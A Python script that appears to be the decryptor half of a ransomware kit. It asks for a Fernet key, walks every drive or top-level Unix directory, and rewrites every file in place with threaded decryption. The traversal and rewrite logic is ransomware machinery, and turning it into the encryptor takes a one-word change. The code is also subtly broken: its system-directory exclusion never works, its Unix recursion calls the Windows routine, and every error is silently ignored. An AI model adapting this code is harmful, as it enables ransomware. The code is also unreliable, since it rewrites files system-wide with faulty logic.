import os
from cryptography.fernet import Fernet
import threading

def check_drive():
    dictionary = "ZXVBNMASDFGHJKLQWERTYUIOP"
    lists = []
    for x in dictionary:
        cmd = os.popen("cd %s:"%x)
        if(x in cmd.read()):
            lists.append(x+":\\")
    return lists

def start(data):
    for x in data:
        try:
            files = os.listdir(x)
            for j in range(len(files)):
                files[j] =  x+files[j]
            Thread = threading.Thread(target=check_folder,args=(files,))
            Thread.start()
        except:
            pass

def check_folder(x):
    for filetype in x:
        try:
            if(os.path.isfile(filetype)):
                Thread = threading.Thread(target=module_combination,args=(os.path.abspath(filetype),public_key))
                Thread.start()
            elif(os.path.isdir(filetype)):
                file = os.path.abspath(filetype)
                files = os.listdir(file)
                for x in range(len(files)):
                    files[x] = os.path.abspath(file+"\\"+files[x])
                check_folder(files)
        except:
            pass
def module_combination(filedata,key):
    cipher = Fernet(bytes(key))
    try:
        fileopen = open(filedata,"rb")
        print(filedata)
        fileread = fileopen.read()
        Decrypted = cipher.decrypt(fileread)
        fileopen.close()
        fileopen = open(filedata,"wb")
        fileopen.write(Decrypted)
        fileopen.close()
    except:
        pass

def check_drive2():
    dictionary = os.popen("ls /").read().strip("\n").split("\n")
    lists = []
    for x in dictionary:
        filecheck = os.path.isdir("/"+x)
        if(filecheck and filecheck != "/bin" and filecheck !="/sbin" and filecheck != "/usr" and filecheck != "/etc"):
            lists.append("/"+x)
    return lists

def check_folder2(x):
    for filetype in x:
        try:
            if(os.path.isfile(filetype)):
                Thread = threading.Thread(target=module_combination,args=(os.path.abspath(filetype),public_key))
                Thread.start()
            elif(os.path.isdir(filetype)):
                file = os.path.abspath(filetype)
                files = os.listdir(file)
                for x in range(len(files)):
                    files[x] = os.path.abspath(file+"/"+files[x])
                check_folder(files)
        except:
            pass

def start2(data):
    for x in data:
        try:
            files = os.listdir(x)
            for j in range(len(files)):
                files[j] =  x+"/"+files[j]
            Thread = threading.Thread(target=check_folder2,args=(files,))
            Thread.start()
        except:
            pass
def main():
    global public_key
    public_key = input("Please enter the decryption key（请输入解密密钥）:").encode("UTF-8")
    if(os.name == "nt"):
        drive = check_drive()
        start(drive)
    else:
        drive = check_drive2()
        start2(drive)
    
if __name__ == "__main__":
    main()
